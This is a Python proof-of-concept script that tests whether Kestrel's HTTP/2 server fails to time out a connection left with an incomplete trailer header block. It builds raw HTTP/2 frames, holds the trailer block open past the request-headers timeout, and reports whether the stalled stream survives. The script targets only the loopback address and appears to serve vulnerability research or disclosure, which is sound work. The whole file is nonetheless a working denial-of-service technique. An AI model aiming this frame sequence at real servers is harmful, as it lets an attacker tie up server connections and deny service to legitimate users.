#!/usr/bin/env python3
"""Loopback proof for Kestrel's missing timeout on fragmented HTTP/2 trailers."""

from __future__ import annotations

import select
import socket
import struct
import time


HOST = "127.0.0.1"
PORT = 5001
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FRAME_SETTINGS = 0x4
FRAME_GOAWAY = 0x7
FRAME_HEADERS = 0x1
FRAME_DATA = 0x0
FRAME_CONTINUATION = 0x9
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4


def frame(frame_type: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
    if len(payload) > 0xFFFFFF:
        raise ValueError("payload too large")
    return len(payload).to_bytes(3, "big") + bytes((frame_type, flags)) + struct.pack(
        "!I", stream_id & 0x7FFFFFFF
    ) + payload


def recv_exact(sock: socket.socket, length: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < length:
        try:
            chunk = sock.recv(length - len(chunks))
        except ConnectionResetError as error:
            raise EOFError(f"connection reset after {len(chunks)}/{length} bytes") from error
        if not chunk:
            raise EOFError(f"EOF after {len(chunks)}/{length} bytes")
        chunks.extend(chunk)
    return bytes(chunks)


def recv_frame(sock: socket.socket) -> tuple[int, int, int, bytes]:
    header = recv_exact(sock, 9)
    length = int.from_bytes(header[:3], "big")
    frame_type = header[3]
    flags = header[4]
    stream_id = struct.unpack("!I", header[5:])[0] & 0x7FFFFFFF
    return frame_type, flags, stream_id, recv_exact(sock, length)


def connect() -> socket.socket:
    sock = socket.create_connection((HOST, PORT), timeout=3)
    sock.sendall(PREFACE + frame(FRAME_SETTINGS, 0, 0))

    while True:
        frame_type, flags, _stream_id, _payload = recv_frame(sock)
        if frame_type == FRAME_SETTINGS and not flags & FLAG_ACK:
            sock.sendall(frame(FRAME_SETTINGS, FLAG_ACK, 0))
            break

    return sock


def request_headers() -> bytes:
    # HPACK: indexed :method POST, :scheme http, :path /, then literal
    # :authority = 127.0.0.1:5001 without indexing or Huffman coding.
    authority = b"127.0.0.1:5001"
    return b"\x83\x86\x84\x01" + bytes((len(authority),)) + authority


def describe(frame_tuple: tuple[int, int, int, bytes]) -> str:
    frame_type, flags, stream_id, payload = frame_tuple
    suffix = ""
    if frame_type == FRAME_GOAWAY and len(payload) >= 8:
        error = struct.unpack("!I", payload[4:8])[0]
        suffix = f" error={error}"
    return (
        f"type={frame_type} flags=0x{flags:02x} stream={stream_id} "
        f"length={len(payload)}{suffix}"
    )


def drain_available(sock: socket.socket, timeout: float = 0.0) -> list[tuple[int, int, int, bytes]]:
    frames = []
    while select.select([sock], [], [], timeout)[0]:
        try:
            frames.append(recv_frame(sock))
        except EOFError:
            break
        timeout = 0.0
    return frames


def main() -> int:
    initial = connect()
    trailer = connect()
    headers = request_headers()

    # Control: complete HPACK bytes but omit END_HEADERS on the initial block.
    initial.sendall(frame(FRAME_HEADERS, FLAG_END_STREAM, 1, headers))

    # Candidate: complete the initial block, stream 16 KiB to a body-reading app,
    # then start an empty trailer block with END_STREAM but omit END_HEADERS.
    trailer.sendall(frame(FRAME_HEADERS, FLAG_END_HEADERS, 1, headers))
    trailer.sendall(frame(FRAME_DATA, 0, 1, b"A" * (16 * 1024)))
    trailer.sendall(frame(FRAME_HEADERS, FLAG_END_STREAM, 1))

    started = time.monotonic()
    deadline = started + 35.0
    initial_frames = []
    trailer_frames = []
    open_sockets = {initial, trailer}
    while time.monotonic() < deadline:
        timeout = min(0.5, deadline - time.monotonic())
        readable, _, _ = select.select(list(open_sockets), [], [], timeout)
        for sock in readable:
            try:
                item = recv_frame(sock)
            except EOFError:
                open_sockets.discard(sock)
                continue
            (initial_frames if sock is initial else trailer_frames).append(item)

    elapsed = time.monotonic() - started
    initial.settimeout(0.2)
    trailer.settimeout(0.2)
    initial_frames.extend(drain_available(initial))
    trailer_frames.extend(drain_available(trailer))

    initial_timed_out = any(
        item[0] == FRAME_GOAWAY and len(item[3]) >= 8 and struct.unpack("!I", item[3][4:8])[0] == 2
        for item in initial_frames
    )

    # The stalled trailer connection should still accept its required continuation.
    trailer.sendall(frame(FRAME_CONTINUATION, FLAG_END_HEADERS, 1))
    completion_frames = []
    completion_deadline = time.monotonic() + 3.0
    while time.monotonic() < completion_deadline:
        readable, _, _ = select.select([trailer], [], [], completion_deadline - time.monotonic())
        if not readable:
            break
        try:
            item = recv_frame(trailer)
        except EOFError:
            break
        completion_frames.append(item)
        if item[0] == FRAME_DATA and item[1] & FLAG_END_STREAM:
            break

    completed = any(
        item[0] == FRAME_DATA and item[1] & FLAG_END_STREAM for item in completion_frames
    )

    print(f"elapsed={elapsed:.3f}s")
    print("initial-control:")
    for item in initial_frames:
        print(f"  {describe(item)}")
    print("trailer-before-completion:")
    for item in trailer_frames:
        print(f"  {describe(item)}")
    print("trailer-after-continuation:")
    for item in completion_frames:
        print(f"  {describe(item)}")
    print(f"initial_request_headers_timeout={initial_timed_out}")
    print(f"fragmented_trailers_survived_and_completed={completed}")

    initial.close()
    trailer.close()
    return 0 if initial_timed_out and completed else 1


if __name__ == "__main__":
    raise SystemExit(main())
